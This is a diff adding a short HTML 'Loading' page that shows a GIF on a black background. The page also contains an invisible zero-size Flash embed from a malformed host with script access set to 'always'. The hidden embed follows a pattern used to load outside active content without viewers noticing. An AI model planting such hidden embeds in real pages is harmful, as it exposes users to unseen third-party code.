@@ -1,0 +1,21 @@
+<html>
+	<head>
+		<title>Loading</title>
+		
+		<style type="text/css">
+			body {
+				margin:0px;
+				padding:0px;
+				background-color:#000000;
+			}
+		</style>
+		
+	</head>
+	<body>
+		<object style="height:0px; width:0px;">
+			<embed src="https://www.yftf4321" type="application/x-shockwave-flash" allowfullscreen="true" allowScriptAccess="always" width="0" height="0">
+		</object>
+	
+		<img src="https://media.giphy.com/media/3rGNW9MpPndRu/giphy.gif" style="max-width:100%; max-height:100%;" alt="" />
+	</body>
+</html>
